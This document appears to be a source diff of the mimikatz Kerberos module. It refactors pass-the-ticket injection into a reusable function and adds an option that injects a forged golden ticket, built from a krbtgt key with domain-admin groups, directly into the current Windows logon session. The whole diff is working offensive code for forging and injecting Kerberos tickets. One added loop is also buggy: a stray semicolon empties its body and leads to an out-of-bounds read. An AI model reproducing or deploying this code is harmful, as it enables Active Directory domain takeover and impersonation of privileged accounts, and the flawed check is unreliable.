@@ -53,41 +53,49 @@ NTSTATUS LsaCallKerberosPackage(PVOID ProtocolSubmitBuffer, ULONG SubmitBufferLe
 
 NTSTATUS kuhl_m_kerberos_ptt(int argc, wchar_t * argv[])
 {
-	NTSTATUS status, packageStatus;
 	PBYTE fileData;
-	DWORD fileSize, submitSize, responseSize;
-	PKERB_SUBMIT_TKT_REQUEST pKerbSubmit;
-	PVOID dumPtr;
+	DWORD fileSize;
 
 	if(argc)
 	{
 		if(kull_m_file_readData(argv[argc - 1], &fileData, &fileSize))
 		{
-			submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + fileSize;
-			if(pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST) LocalAlloc(LPTR, submitSize))
-			{
-				pKerbSubmit->MessageType = KerbSubmitTicketMessage;
-				pKerbSubmit->KerbCredSize = fileSize;
-				pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
-				RtlCopyMemory((PBYTE) pKerbSubmit + pKerbSubmit->KerbCredOffset, fileData, pKerbSubmit->KerbCredSize);
-
-				status = LsaCallKerberosPackage(pKerbSubmit, submitSize, &dumPtr, &responseSize, &packageStatus);
-				if(NT_SUCCESS(status))
-				{
-					if(NT_SUCCESS(packageStatus))
-						kprintf(L"Ticket \'%s\' successfully submitted for current session\n", argv[0]);
-					else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbSubmitTicketMessage / Package : %08x\n", packageStatus);
-				}
-				else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbSubmitTicketMessage : %08x\n", status);
-
-				LocalFree(pKerbSubmit);
-			}
+			if(NT_SUCCESS(kuhl_m_kerberos_ptt_data(fileData, fileSize)))
+				kprintf(L"Ticket \'%s\' successfully submitted for current session\n", argv[0]);
 			LocalFree(fileData);
 		}
 		else PRINT_ERROR_AUTO(L"kull_m_file_readData");
 	} else PRINT_ERROR(L"Missing argument : ticket filename\n");
-
 	return STATUS_SUCCESS;
+}
+
+NTSTATUS kuhl_m_kerberos_ptt_data(PVOID data, DWORD dataSize)
+{
+	NTSTATUS status = STATUS_MEMORY_NOT_ALLOCATED, packageStatus;
+	DWORD submitSize, responseSize;
+	PKERB_SUBMIT_TKT_REQUEST pKerbSubmit;
+	PVOID dumPtr;
+
+	submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + dataSize;
+	if(pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST) LocalAlloc(LPTR, submitSize))
+	{
+		pKerbSubmit->MessageType = KerbSubmitTicketMessage;
+		pKerbSubmit->KerbCredSize = dataSize;
+		pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
+		RtlCopyMemory((PBYTE) pKerbSubmit + pKerbSubmit->KerbCredOffset, data, dataSize);
+
+		status = LsaCallKerberosPackage(pKerbSubmit, submitSize, &dumPtr, &responseSize, &packageStatus);
+		if(NT_SUCCESS(status))
+		{
+			status = packageStatus;
+			if(!NT_SUCCESS(status))
+				PRINT_ERROR(L"LsaCallAuthenticationPackage KerbSubmitTicketMessage / Package : %08x\n", status);
+		}
+		else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbSubmitTicketMessage : %08x\n", status);
+
+		LocalFree(pKerbSubmit);
+	}
+	return status;
 }
 
 NTSTATUS kuhl_m_kerberos_purge(int argc, wchar_t * argv[])
@@ -116,7 +124,9 @@ NTSTATUS kuhl_m_kerberos_tgt(int argc, wchar_t * argv[])
 	PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
 	DWORD szData;
 	KIWI_KERBEROS_TICKET kiwiTicket = {0};
-	
+	DWORD i;
+	BOOL isNull = FALSE;
+
 	status = LsaCallKerberosPackage(&kerbRetrieveRequest, sizeof(KERB_RETRIEVE_TKT_REQUEST), (PVOID *) &pKerbRetrieveResponse, &szData, &packageStatus);
 	kprintf(L"Keberos TGT of current session : ");
 	if(NT_SUCCESS(status))
@@ -139,7 +149,12 @@ NTSTATUS kuhl_m_kerberos_tgt(int argc, wchar_t * argv[])
 			kiwiTicket.Ticket.Length = pKerbRetrieveResponse->Ticket.EncodedTicketSize;
 			kiwiTicket.Ticket.Value = pKerbRetrieveResponse->Ticket.EncodedTicket;
 			kuhl_m_kerberos_ticket_display(&kiwiTicket, FALSE);
-			kprintf(L"\n(NULL session key means allowtgtsessionkey is not set to 1)\n");
+			
+			for(i = 0; !isNull && (i < kiwiTicket.Ticket.Length); i++);
+				isNull |= !kiwiTicket.Ticket.Value[i];
+			if(isNull)
+				kprintf(L"\n\n\t** Session key is NULL! It means allowtgtsessionkey is not set to 1 **\n");
+
 			LsaFreeReturnBuffer(pKerbRetrieveResponse);
 		}
 		else if(packageStatus == SEC_E_NO_CREDENTIALS)
@@ -241,12 +256,12 @@ GROUP_MEMBERSHIP defaultGroups[] = {{513, DEFAULT_GROUP_ATTRIBUTES}, {512, DEFAU
 NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 {
 	BYTE key[AES_256_KEY_LENGTH] = {0};
-	DWORD i, j, nbGroups, id = 500, keyType, keyLen;
+	DWORD i, j, nbGroups, id = 500, keyType, keyLen, App_KrbCredSize;
 	PCWCHAR szUser, szDomain, szSid, szKey, szId, szGroups, base, filename;
 	PISID pSid;
 	PGROUP_MEMBERSHIP dynGroups = NULL, groups;
 	PDIRTY_ASN1_SEQUENCE_EASY App_KrbCred;
-
+	BOOL isPtt = kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL);
 	kull_m_string_args_byName(argc, argv, L"ticket", &filename, L"ticket.kirbi");
 
 	if(kull_m_string_args_byName(argc, argv, L"admin", &szUser, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
@@ -325,6 +340,7 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 							groups = defaultGroups;
 							nbGroups = ARRAYSIZE(defaultGroups);
 						}
+
 						if(kull_m_string_stringToHex(szKey, key, keyLen))
 						{
 							kprintf(
@@ -338,17 +354,25 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 							kprintf(L"\nkrbtgt    : ");
 								
 							kull_m_string_wprintf_hex(key, keyLen, 0); kprintf(L" - %s\n", kuhl_m_kerberos_ticket_etype(keyType));
-							kprintf(L"-> Ticket : %s\n\n", filename);
+							kprintf(L"-> Ticket : %s\n\n", isPtt ? L"** Pass The Ticket **" : filename);
 
 							if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, pSid, key, keyLen, keyType, id, groups, nbGroups))
 							{
-								if(kull_m_file_writeData(filename, (PBYTE) App_KrbCred, kull_m_asn1_getSize(App_KrbCred)))
+								App_KrbCredSize = kull_m_asn1_getSize(App_KrbCred);
+								if(isPtt)
+								{
+									if(NT_SUCCESS(kuhl_m_kerberos_ptt_data(App_KrbCred, App_KrbCredSize)))
+										kprintf(L"\nGolden ticket for '%s @ %s' successfully submitted for current session\n", szUser, szDomain);
+								}
+								else if(kull_m_file_writeData(filename, (PBYTE) App_KrbCred, App_KrbCredSize))
 									kprintf(L"\nFinal Ticket Saved to file !\n");
 								else PRINT_ERROR_AUTO(L"\nkull_m_file_writeData");
+
+								LocalFree(App_KrbCred);
 							}
 							else PRINT_ERROR(L"KrbCred error\n");
 						}
-						else PRINT_ERROR(L"Krbtgt key size length must be 32 (16 bytes)\n");
+						else PRINT_ERROR(L"Krbtgt key size length must be 32 (16 bytes) for RC4/AES128 or 64 (32 bytes) for AES256\n");
 					}
 					else PRINT_ERROR(L"Missing krbtgt key argument (/rc4 or /aes128 or /aes256)\n");
 
